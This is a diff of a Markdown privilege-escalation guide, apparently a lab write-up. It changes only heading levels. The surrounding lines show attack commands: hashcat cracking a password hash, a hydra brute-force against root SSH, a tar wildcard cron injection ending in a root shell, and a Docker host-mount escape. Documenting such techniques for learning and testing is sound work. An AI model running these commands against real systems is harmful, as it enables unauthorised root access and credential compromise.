@@ -173,7 +173,7 @@ Download and launch LinEnum.sh:
 
 I've cut some parts:
 
-## Bruteforce with hashcat
+### Bruteforce with hashcat
 
 ```sh 
 -e [-] Contents of /etc/passwd:
@@ -185,7 +185,7 @@ LinEnum.sh found a hash, we can bruteforce with JohnTheRipper or HashCat (more f
     $ wget -cv https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt
     $ hashcat AzER3pBZh6WZE -m 1500 rockyou-75.txt
 
-## Bruteforce SSH 
+### Bruteforce SSH 
 
 ```sh
 -e [-] Root is allowed to login via SSH:
@@ -197,7 +197,7 @@ We can bruteforce ssh too with `root`, with a nice dictionnary (there are somes 
     $ wget -cv https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkc0de.txt
     $ hydra -t 4 -l root -P darkc0de.txt 192.168.1.14 ssh
 
-## Tar wildcard injection
+### Tar wildcard injection
 
 ```sh
 -e [-] Crontab contents:
@@ -235,7 +235,7 @@ And wait for the cron job start to become root.
     id 
     uid=0(root) gid=0(root) groups=0(root)
 
-## Docker
+### Docker
 
 ```sh
 -e [+] Looks like we're hosting Docker:
@@ -248,7 +248,7 @@ For docker, we can use [rootplease](https://hub.docker.com/r/chrisfosterelli/roo
     $ git clone https://github.com/chrisfosterelli/dockerrootplease
     $ docker run -v /:/hostOS -i -t dockerrootplease/rootplease
 
-# SUID
+### SUID
 
 A look at [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) to find a command to search suid file:
 
